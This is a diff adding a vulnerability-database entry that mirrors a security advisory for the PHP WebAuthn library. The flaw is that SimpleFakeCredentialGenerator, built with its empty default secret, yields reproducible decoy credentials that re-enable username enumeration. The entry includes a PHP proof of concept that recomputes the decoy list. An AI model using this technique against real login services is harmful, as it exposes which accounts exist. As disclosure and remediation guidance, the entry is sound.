@@ -1,0 +1,116 @@
+[basic]
+description = '''
+## Impact
+
+`Webauthn\SimpleFakeCredentialGenerator` is the library-provided default implementation of the `FakeCredentialGenerator` interface. It returns a stable list of decoy `PublicKeyCredentialDescriptor` objects for a given username so that an assertion request for an unknown user looks the same as a request for a real one, which mitigates username enumeration.
+
+The generator derives the whole decoy list from a single seed:
+
+```php
+$seed = hash('sha256', $username . $this->secret, true);
+```
+
+When it is constructed without a secret (its constructor default, `$secret = ''`), the seed depends only on the username. The username is attacker-chosen and the algorithm is public, so an unauthenticated requester can recompute the exact, byte-for-byte decoy list the server returns for any username. The attacker then compares a probed username's response against the locally computed list and decides whether the account is real or fake, which is precisely the distinction the mechanism is meant to hide.
+
+With any non-empty secret the seed becomes a value the attacker cannot evaluate and the mitigation holds. The defect is the empty default, not the algorithm.
+
+## Affected configurations
+
+- Direct use of the library (`web-auth/webauthn-lib`) where `SimpleFakeCredentialGenerator` is instantiated without a secret.
+- Any integration that wires the generator with an empty secret.
+
+The Symfony bundle is not affected with its default configuration: it injects the application secret (`kernel.secret`) into the generator, so out-of-the-box deployments already use a non-empty secret. Deployments that set an empty `kernel.secret` are affected.
+
+## Patches
+
+Fixed in 5.3.5. The generator now emits a deprecation when it is constructed without a secret, which surfaces the misconfiguration in logs and the Symfony profiler. A non-empty secret will be required in 6.0.0. The recommended remediation is to always provide a non-empty, deployment-specific secret.
+
+## Workarounds
+
+Construct `SimpleFakeCredentialGenerator` with a non-empty secret value (for example the application secret), or provide a custom `FakeCredentialGenerator` implementation seeded with a secret.
+
+## Proof of concept
+
+```php
+<?php
+declare(strict_types=1);
+
+require $src . '/PublicKeyCredentialDescriptor.php';
+require $src . '/FakeCredentialGenerator.php';
+require $src . '/SimpleFakeCredentialGenerator.php';
+
+use Webauthn\PublicKeyCredentialDescriptor;
+use Webauthn\SimpleFakeCredentialGenerator;
+
+$username = 'alice@example.com';
+
+// 1. The \"server\" runs the library default wiring (cache=null, secret='').
+$server = new SimpleFakeCredentialGenerator();
+$refl = new ReflectionMethod(SimpleFakeCredentialGenerator::class, 'generateCredentials');
+$refl->setAccessible(true);
+$serverDescriptors = $refl->invoke($server, $username);
+
+// 2. The \"attacker\" recomputes the same algorithm, knowing only the username.
+function attackerRecompute(string $username): array {
+    $transports = [
+        PublicKeyCredentialDescriptor::AUTHENTICATOR_TRANSPORT_USB,
+        PublicKeyCredentialDescriptor::AUTHENTICATOR_TRANSPORT_NFC,
+        PublicKeyCredentialDescriptor::AUTHENTICATOR_TRANSPORT_BLE,
+        PublicKeyCredentialDescriptor::AUTHENTICATOR_TRANSPORT_HYBRID,
+        PublicKeyCredentialDescriptor::AUTHENTICATOR_TRANSPORT_INTERNAL,
+        PublicKeyCredentialDescriptor::AUTHENTICATOR_TRANSPORT_SMART_CARD,
+    ];
+    $seed = hash('sha256', $username . '', true); // empty secret
+    $count = (ord($seed[0]) % 3) + 1;
+    $out = [];
+    for ($i = 0; $i < $count; $i++) {
+        $credSeed = hash('sha256', $seed . pack('N', $i), true);
+        $transportCount = (ord($credSeed[0]) % 2) + 1;
+        $sel = [];
+        for ($j = 0; $j < $transportCount; $j++) {
+            $sel[] = $transports[ord($credSeed[$j + 1]) % count($transports)];
+        }
+        $sel = array_values(array_unique($sel));
+        $out[] = ['type' => PublicKeyCredentialDescriptor::CREDENTIAL_TYPE_PUBLIC_KEY,
+                  'id' => hash('sha256', $credSeed . $username), 'transports' => $sel];
+    }
+    return $out;
+}
+
+// 3. The two lists match byte-for-byte, so the decoy is reproducible.
+//    The same call with a non-empty secret diverges, confirming the defect
+//    is the default value rather than the algorithm.
+```
+
+With the default empty secret the library's fake-credential list is bit-for-bit reproducible from the public username alone, which defeats the username enumeration mitigation. The same call with a non-empty secret diverges.
+
+## Severity
+
+Low. The decoy responses are still well-formed and the issue only re-enables username enumeration, and only when the generator is used without a secret (which is not the case for default Symfony bundle deployments).
+
+## Credits
+
+Found during an internal security audit of the project.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Webauthn: SimpleFakeCredentialGenerator with an empty secret produces predictable fake credentials, weakening username enumeration protection"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-gq4g-fpc9-vjfq"]
+ave_id = "AVE-2026-1116"
+
+[meta]
+collected_at = "2026-08-06T04:59:30.216827389+00:00"
+status = "completed"
+
+[references]
+urls = []
